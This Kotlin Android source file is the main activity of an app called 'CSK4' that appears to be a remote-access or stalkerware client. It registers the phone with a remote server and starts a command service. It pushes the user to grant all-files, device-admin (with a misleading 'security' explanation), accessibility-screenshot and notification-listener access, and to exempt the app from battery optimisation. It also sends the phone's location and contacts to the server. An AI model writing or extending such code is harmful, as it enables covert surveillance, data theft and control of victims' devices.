package com.csk4.app

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONObject

class MainActivity : AppCompatActivity() {

    private lateinit var tvStatus: TextView
    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvStatus = findViewById(R.id.tvStatus)

        // ============ BUTTONS ============
        findViewById<Button>(R.id.btnWebPanel).setOnClickListener {
            startActivity(Intent(this, WebViewActivity::class.java))
        }

        findViewById<Button>(R.id.btnAdmin)?.setOnClickListener {
            enableDeviceAdmin()
        }

        findViewById<Button>(R.id.btnAccessibility)?.setOnClickListener {
            openAccessibilitySettings()
        }

        findViewById<Button>(R.id.btnNotificationAccess)?.setOnClickListener {
            openNotificationAccessSettings()
        }

        findViewById<Button>(R.id.btnStorageAccess)?.setOnClickListener {
            openStorageAccessSettings()
        }

        findViewById<Button>(R.id.btnBattery)?.setOnClickListener {
            openBatteryOptimization()
        }

        findViewById<Button>(R.id.btnStartService)?.setOnClickListener {
            startService(Intent(this, CommandService::class.java))
            Toast.makeText(this, "✅ Service started", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnStopService)?.setOnClickListener {
            stopService(Intent(this, CommandService::class.java))
            Toast.makeText(this, "⏹️ Service stopped", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnLocation)?.setOnClickListener {
            CommandHandler(this, deviceId).handleLocation()
            Toast.makeText(this, "📍 Location sent", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnContacts)?.setOnClickListener {
            CommandHandler(this, deviceId).handleContacts()
            Toast.makeText(this, "👥 Contacts sent", Toast.LENGTH_SHORT).show()
        }

        // ============ REGISTER + START ============
        registerDevice()
        startService(Intent(this, CommandService::class.java))

        // Auto prompt special permissions
        Handler(Looper.getMainLooper()).postDelayed({
            autoPromptSpecialPermissions()
        }, 2000)
    }

    // ============ PERMISSION AUTO-PROMPT ============
    private fun autoPromptSpecialPermissions() {
        // 1. All Files Access (Android 11+)
        if (Build.VERSION.SDK_INT >= 30) {
            if (!Environment.isExternalStorageManager()) {
                Toast.makeText(this, "📁 All Files Access ON karein", Toast.LENGTH_LONG).show()
                try {
                    val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    i.data = Uri.parse("package:$packageName")
                    startActivity(i)
                } catch (e: Exception) {
                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                }
                return
            }
        }

        // 2. Device Admin
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            enableDeviceAdmin()
            return
        }

        // 3. Accessibility
        if (ScreenshotService.instance == null) {
            Toast.makeText(this, "📸 Accessibility ON karein", Toast.LENGTH_LONG).show()
            openAccessibilitySettings()
            return
        }

        // 4. Notification Access
        if (!isNotificationServiceEnabled()) {
            Toast.makeText(this, "🔔 Notification Access ON karein", Toast.LENGTH_LONG).show()
            openNotificationAccessSettings()
            return
        }

        // 5. Battery Optimization
        val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
        if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(packageName)) {
            Toast.makeText(this, "🔋 Battery Optimization OFF karein", Toast.LENGTH_LONG).show()
            openBatteryOptimization()
        }
    }

    // ============ SETTINGS OPENERS ============
    private fun enableDeviceAdmin() {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable for lock control & security")
            startActivity(i)
        } else {
            Toast.makeText(this, "✅ Admin already active", Toast.LENGTH_SHORT).show()
        }
    }

    private fun openAccessibilitySettings() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        Toast.makeText(this, "CSK4 Accessibility ON karein", Toast.LENGTH_LONG).show()
    }

    private fun openNotificationAccessSettings() {
        try {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
        } catch (e: Exception) {
            startActivity(Intent(Settings.ACTION_SETTINGS))
        }
        Toast.makeText(this, "CSK4 Notification Access ON karein", Toast.LENGTH_LONG).show()
    }

    private fun openStorageAccessSettings() {
        if (Build.VERSION.SDK_INT >= 30) {
            try {
                val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                i.data = Uri.parse("package:$packageName")
                startActivity(i)
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        }
    }

    private fun openBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= 23) {
            try {
                val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                i.data = Uri.parse("package:$packageName")
                startActivity(i)
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
            }
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    // ============ STATUS UPDATE ============
    private fun updateStatus() {
        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val bat = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminActive = dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
        val accActive = ScreenshotService.instance != null
        val storageAccess = if (Build.VERSION.SDK_INT >= 30) Environment.isExternalStorageManager() else true
        val notifAccess = isNotificationServiceEnabled()

        tvStatus.text = """
            🆔 Device: $deviceId
            📱 ${Build.MODEL}
            🤖 Android ${Build.VERSION.RELEASE}
            🔋 Battery: $bat%
            🛡️ Admin: ${if (adminActive) "✅" else "❌"}
            📸 Accessibility: ${if (accActive) "✅" else "❌"}
            📁 Storage: ${if (storageAccess) "✅" else "❌"}
            🔔 Notification: ${if (notifAccess) "✅" else "❌"}
            🌐 ${Config.SERVER_URL}
        """.trimIndent()

        // Auto-hide buttons
        findViewById<Button>(R.id.btnAdmin)?.visibility = if (adminActive) View.GONE else View.VISIBLE
        findViewById<Button>(R.id.btnAccessibility)?.visibility = if (accActive) View.GONE else View.VISIBLE
        findViewById<Button>(R.id.btnStorageAccess)?.visibility = if (storageAccess) View.GONE else View.VISIBLE
        findViewById<Button>(R.id.btnNotificationAccess)?.visibility = if (notifAccess) View.GONE else View.VISIBLE
    }

    // ============ REGISTER ============
    private fun registerDevice() {
        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val bat = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        Volley.newRequestQueue(this).add(JsonObjectRequest(
            Request.Method.POST, "${Config.SERVER_URL}/api/device/register",
            JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", "${Build.BRAND} ${Build.MODEL}")
                put("model", Build.MODEL)
                put("android", Build.VERSION.RELEASE)
                put("battery", bat)
                put("token", Config.DEVICE_TOKEN)
            },
            { Toast.makeText(this, "✅ Registered", Toast.LENGTH_SHORT).show() },
            { Toast.makeText(this, "❌ Server fail", Toast.LENGTH_SHORT).show() }
        ))
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }
}
